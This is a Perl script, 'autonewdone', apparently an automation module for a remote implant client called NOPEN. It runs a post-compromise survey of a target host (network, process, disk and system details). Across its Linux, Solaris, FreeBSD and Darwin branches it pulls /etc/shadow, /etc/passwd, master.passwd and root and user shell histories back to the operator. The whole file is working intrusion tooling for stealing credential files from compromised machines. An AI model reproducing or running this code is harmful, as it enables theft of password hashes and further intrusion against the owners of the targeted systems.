#!/usr/bin/env perl
#
# 20101006 - This version of autonewdone is much shorter; it only does
# the absolute minimum number of commands required.
#
$VER="2.0.2.8" ;
$ext = $$ ;			# limits likelihood of concurrent autodone's colliding
				# BUT: still possible.
				# not too likely to happen.

$| = 1;
myinit() ;
# promptkill puts itself into /usr/local/bin if none or an older one is there
# so this makes sure /usr/local/bin is current even if promptkill does not get
# used this op
`$opbin/promptkill -v` if (-x "$opbin/promptkill");

# following is first time autonext is used without $$ extension--fewer collisions?
# In case this is there from previous run, we save it as .NNNN
preservefile("$opdown/hostinfo.$nopen_rhostname") unless $autonohostinfo;

my @autoargv = ();
if ((-e "$optmp/autonewdone.$nopen_rhostname" or -e "$optmp/autodont") and
    (!$redo and !$autonohostinfo)) {
  myalert("autonewdone has already completed on this target. Use -gs auto FORCE [SHORT] to re-do it.");
} else {
  dosurvey_short();
}

# End with true value as we require this script elsewhere.
1;

sub dosurvey_short {
  # Are we on a first hop?
  ($output,$nopenlines,@firsthops) = doit("-lsh didthis | grep noclient | grepip");
  my $firstin = 0;
  foreach my $ip (@firsthops) {
    $firstin++ if $ip eq $nopen_myip;
    last if $firstin;
  }

  myalert("NOLOGGING","BEGIN running $opetc/autonewdone.short on $nopen_rhostname output in $nopen_mylog (v.$VER)");
  system("touch $optmp/autonewdone.INPROGRESS.$targetpid");

  # Write out the nopen_auto.$nopen_mypid file that yells if we didn't finish a run.
  open(YELLPROMPT, "> $optmp/.gsyell.$nopen_rhostname.$nopen_mypid") or myalert("Can't create warning text! $!");
  print YELLPROMPT "${COLOR_FAILURE}\n".
    "WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n".
    "This should not happen. Please report this now\n".
    "(yes, now...in person...go....shoo!).\n\n".
    "You can hit return here to get your window back, though.\n\n";
  print YELLPROMPT "${COLOR_FAILURE}\n".
    "WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n";
  close(YELLPROMPT);
  open(GSYELL, "> $opetc/nopen_auto.$nopen_mypid") or myalert("Can't create warning script! $!");
  print GSYELL "#NOGS\n";
  print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.out.$nopen_mypid\n";
  print GSYELL "-lsh -nohist test -f $optmp/autonewdone.$nopen_rhostname || ".
      "$opetc/autogetinput -O $optmp/.gsyell.out.$nopen_mypid -P $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
  print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
  print GSYELL "-lsh -nohist rm -f $optmp/autonewdone.INPROGRESS.$targetpid\n";
  close(GSYELL);

  # Begin running the actual autonewdone commands.
  doit("-lsh date -u");
  doit("\\hostname",
       "-cat /etc/hostname*",
      );

  doit("netstat -an ; netstat -rn >> T:$opdown/netstat.$nopen_rhostname");

  push(@autoargv,"-s");
  push(@autoargv,"autodone");
  mydo("autopscheck",@autoargv);

  tickleifneedbe($builtinsonly);

  # So much simpler!
  ($newdoneoutput,$nopenlines,@newdoneoutput) =
    nopenlss("-G${autoreget}YUFM100000",
#  nopengetfiles("SIZEMAX=100000 GETZERO=1",
	     "/etc/hosts*",
	     "/etc/inet/hosts*",
	     "/etc/syslog.conf",
	     "/etc/inetd.conf",
	     "/etc/inet/inetd.conf",
	     "/etc/resolv.conf",
	     "/etc/passwd*",
	     "/etc/shadow*",
	     "/etc/security/passwd*",
	    ) unless ($freebsdtarget);
	       
  # FreeBSD-specific. This stinks, until bugs are fixed.
  ($newdoneoutput,$nopenlines,@newdoneoutput) =
    nopenlss("-G${autoreget}YUFM100000",
#  nopengetfiles(
	     "/etc/hosts*",
	     "/etc/syslog.conf",
	     "/etc/inetd.conf",
	     "/etc/resolv.conf",
	     "/etc/passwd",
	     "/etc/shadow",
	     "/etc/motd*",
	     "/etc/master.passwd*",
	     "/var/etc/hosts",
	    ) if ($freebsdtarget);
  
  # NEW: Grab root histories from the target.
  if ($freebsdtarget) {
  ($newdoneoutput,$nopenlines,@newdoneoutput) =
    nopenlss("-G${autoreget}YUFM100000",
#    nopengetfiles("SIZEMAX=100000 GETZERO=1",
		  "/root/.history",
	         );
  }
  elsif ($darwintarget) {
  ($newdoneoutput,$nopenlines,@newdoneoutput) =
    nopenlss("-G${autoreget}YUFM100000",
#    nopengetfiles("SIZEMAX=100000 GETZERO=1",
		  "/Users/*/.*history*",
		  "/var/root/.*history*",
		 );
  }
  else {
    ($newdoneoutput,$nopenlines,@newdoneoutput) =
      nopenlss("-G${autoreget}YUFM100000",
#    nopengetfiles("SIZEMAX=100000 GETZERO=1",
  		  "/.*history*",
		  "/root/.*history*",
		  "/export/.*history*",
		 );
  }

  @autoargv = ("autodone");
  mydo("autodfcheck",@autoargv);

  my $datez = "%z";
  $datez = "%Z" if $solaristarget;

  my ($output) = doit("date \"+%a, %d %b %Y %H:%M:%S $datez\"");
  writefile("$opdown/date-rfc2822.$nopen_rhostname",$output);
  
  # Run the (abbreivated) autodothis stuff in here.
  my $statsfile = "$opdown/${targetplatform}stats.cmdout.$nopen_rhostname";
  preservefile($statsfile);
  open(CMDOUT,">$statsfile");
  if ($solaristarget) {
    logdoit("vmstat",
            "iostat",
	   );
  }
  elsif ($linuxtarget) {
    logdoit("lsmod",
            "more /proc/meminfo",
	   );
  }
  close(CMDOUT);
  
  tickleifneedbe($builtinsonly);

  # Save hostid in separate file
  preservefile("$opdown/hostid.$nopen_rhostname");
  doit("hostid 2>/dev/null >T:$opdown/hostid.$nopen_rhostname");
  unlink("$opdown/hostid.$nopen_rhostname")
    unless (-s "$opdown/hostid.$nopen_rhostname");
    
  doit("-ifconfig >> T:$opdown/ifconfig.$nopen_rhostname",
       "=arp >> T:$opdown/arp.$nopen_rhostname",
      );

  preservefile("$opdown/uname-a.$nopen_rhostname");
  ($output) = doit("uname -a > T:$opdown/uname-a.$nopen_rhostname");
  newhostvar("host_uname{$nopen_rhostname}",$output)
    if ($output) ;

  tickleifneedbe($builtinsonly);
  
  ($redo,$thismonth,$today,$thismonthfiles,$todayfiles) =
    whendo("autonewdone","DONE",$thismonth,$today);

  doit("-lsh rm -f $opetc/nopen_auto.$nopen_mypid");
  myalert("NOLOGGING","DONE running $opetc/autonewdone.short");

  doit("-lsh [ -f /current/tmp/$nopen_mypid.namefix ] && source /current/tmp/$nopen_mypid.namefix ; date -u ; $opetc/gethostinfo.pl | grep -v \"^Malformed UTF-8\" | tee $opdown/hostinfo.$nopen_rhostname ; echo -e \"${COLOR_FAILURE}Use \\\"-hostinfo\\\" to see hostinfo pop-up window${COLOR_NORMAL}\"",
      ) unless $autonohostinfo;

  ($output) = doit("-w");
  unless ($builtinsonly) {
    ($output) = doit("w");
  }
  filepopup("$opdown/ps.$nopen_rhostname",
	    "-geometry 183x72-101-0 -title \"autonewdone ps.$nopen_rhostname\""
	   ) unless ($autoforce or $today or $thismonth);

  if ($output) {
    newhostvar("host_wuptime{$nopen_rhostname}",$output);
    if (open(WOUT,">$opdown/wuptime.$nopen_rhostname")) {
      print WOUT $output;
      close(WOUT);
    }
  }
  return 1;
}

sub logdoit {
  foreach my $line (@_) {
    my ($logoutput,$lognopenlines,@logoutput) = doit($line);
    print CMDOUT $lognopenlines;
    print CMDOUT $logoutput;
  }
}

sub myinit {
  # If $willautoport is already defined, we must have been called
  # by another script via require. We do not re-do autoport stuff.
  $calledviarequire = 0;
  if ($willautoport and $socket) {
    progprint("$prog called -gs newdone.short @ARGV");
    $calledviarequire = 1;
  } else {
    $willautoport=1;
    my $autoutils = "../etc/autoutils" ;
    unless (-e $autoutils) {
      $autoutils = "/current/etc/autoutils" ;
    }
    require $autoutils;
    $prog = "-gs newdone.short";
    $vertext = "$prog version $VER\n" ;
    mydie("No user servicable parts inside.\n".
	  "(I.e., noclient calls $prog, not you.)\n".
	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
			      -e $nopen_mylog);
  }

  # Setting $autodone allows any mydo() called functions to know
  # we are in this mode to populate $opdir/latewarnings*
  $autodone=1;

  # This is a fresh instance; previous failed newdones may have
  # issued warnings we are about to repeat, so just dump them.
  unlink("$opdir/latewarnings.$nopen_rhostname");

  # If $socket is already defined, we must have been called
  # by another script via require. We do not re-do autoport stuff.
  $socket = pilotstart(quiet) unless $socket;

  ($redo,$thismonth,$today,$thismonthfiles,$todayfiles) =
    whendo("autonewdone");
}#myinit

